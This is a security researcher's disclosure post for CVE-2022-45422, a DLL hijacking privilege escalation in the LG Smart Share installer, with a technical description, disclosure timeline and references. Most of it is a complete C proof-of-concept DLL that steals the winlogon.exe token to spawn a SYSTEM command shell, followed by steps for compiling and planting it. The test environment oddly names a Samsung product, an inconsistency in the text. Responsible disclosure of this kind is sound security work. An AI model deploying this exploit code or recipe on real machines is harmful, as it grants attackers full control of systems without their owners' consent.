---
title : "CVE-2022-45422: LG Smart Share Local Privilege Escalation Vulnerability"
excerpt: "CVE-2022-45422"

categories:
    - "0-day"
tags:
    - [LG, 0-day, CVE, CVE-2022-45422, EoP, LPE, PE, DLL hijacking, Mitre]
---

## 0x01: Details

- Title: LG Smart Share Local Privilege Escalation Vulnerability
- CVE ID: CVE-2022-45422
- Vendor ID : LVE-HOT-220005
- Advisory Published: 2022/11/24
- Advisory URL : [https://lgsecurity.lge.com/bulletins/pc#updateDetails](https://lgsecurity.lge.com/bulletins/pc#updateDetails)
- CVSS : 7.8 HIGH(CVSS Version 3.x)

## 0x02: Test Environment

- Samsung Smart Switch for Windows : 4.3.22063_6
- OS : Windows 10 Pro 64-bit 21H2 (build 19044.1826)

## 0x03: Vulerability details

When LG SmartShare is installed, local privilege escalation is possible through DLL Hijacking attack.

## 0x04: Techincal description

When installing the LG Smart Share program, various DLLs are loaded. At this time, `!.DLL` is loaded. This `!.DLL` is loaded from the directory registered in user environment variable and system environment variable. By locating the `!.DLL` created by an attacker, an installer with administrator privileges can load this DLL and escalate privileges to SYSTEM, thereby launching a privilege escalation attack by DLL hijacking.

I discovered this vulnerability through [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).

![Untitled](/files/CVE-2022-45422%20LG%20Smart%20Share%20Local%20Privilege%20Escalation%20Vulnerability/Untitled.png)

## 0x05: Proof-of-Concept (PoC)

```c
#include <stdio.h>
#include <windows.h>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>

#pragma comment (lib,"advapi32.lib")

int exploit() {
	DWORD lpidProcess[2048], lpcbNeeded, cProcesses;
	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	int processWinlogonPid;

	if (Process32First(hSnapshot, &p32)) {
		do {
			if (wcscmp(p32.szExeFile, L"winlogon.exe") == 0) {
				printf("[+] Located winlogon.exe by process name (PID %d)\n", p32.th32ProcessID);
				processWinlogonPid = p32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &p32));

		CloseHandle(hSnapshot);
	}

	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());

	if (currentProc) {
		HANDLE TokenHandle = NULL;
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken) {
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

			if (!checkToken) {
				printf("[+] Current process token already includes SeDebugPrivilege\n");
			}
			else {
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0) {
					printf("[+] Added SeDebugPrivilege to the current process token\n");
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);

	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	BOOL OpenToken;
	BOOL Impersonate;
	BOOL Duplicate;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);

	if (!hProcess) {
		printf("[-] Failed to obtain a HANDLE to the target PID\n");
		return -1;
	}

	printf("[+] Obtained a HANDLE to the target PID\n");

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);

	if (!OpenToken) {
		printf("[-] Failed to obtain a HANDLE to the target TOKEN %d\n", GetLastError());
	}

	printf("[+] Obtained a HANDLE to the target TOKEN\n");

	Impersonate = ImpersonateLoggedOnUser(TokenHandle);

	if (!Impersonate) {
		printf("[-] Failed to impersonate the TOKEN's user\n");
		return -1;
	}

	printf("[+] Impersonated the TOKEN's user\n");

	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);

	if (!Duplicate) {
		printf("[-] Failed to duplicate the target TOKEN\n");
		return -1;
	}

	printf("[+] Duplicated the target TOKEN\n");

	BOOL NewProcess;

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);

	NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

	if (!NewProcess) {
		printf("[-] Failed to create a SYSTEM process\n");
		return -1;
	}

	printf("[+] Created a SYSTEM process\n");

	CloseHandle(NewToken);
	CloseHandle(hProcess);
	CloseHandle(TokenHandle);

	return 0;
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
			exploit();
			exit(-1);
            break;
        }

        case DLL_THREAD_ATTACH: {
            break;
        }

        case DLL_THREAD_DETACH: {
            break;
        }

        case DLL_PROCESS_DETACH: {
            break;
        }
    }
    return TRUE;
}
```

1. Use Visual Studio 2019
2. Compile the project in the DLL directory in x86 Release mode
3. Rename the compiled dll to `!.Dll` and place it in the `%USERPROFILE%\AppData\Local\Microsoft\WindowsApps` directory
4. Run LG Smart Share Installer

## 0x06: Affected Products

This vulnerability affects the following product:

- LG Smart Share Version â‰¤ 2.3.1712.1201

## 0x07: Credit information

HeeChan Kim (@heegong123) of TeamH4C

## 0x08: TimeLine

- 2022/06/09 : First time contacted via LG Product Security.
- 2022/06/10 : I received a call from LG Product Security to analyze the vulnerability.
- 2022/06/28 : I recevied a file which is patched via LG Product Security.
- 2022/11/21 : The vulnerability has been patched, and CVE-2022-45422 (LVE-HOT-220005) has been issued.

## 0x09: Reference

- [https://lgsecurity.lge.com/bulletins/pc#updateDetails](https://lgsecurity.lge.com/bulletins/pc#updateDetails)
- [https://www.cve.org/CVERecord?id=CVE-2022-45422](https://www.cve.org/CVERecord?id=CVE-2022-45422)
- [https://nvd.nist.gov/vuln/detail/CVE-2022-45422](https://nvd.nist.gov/vuln/detail/CVE-2022-45422)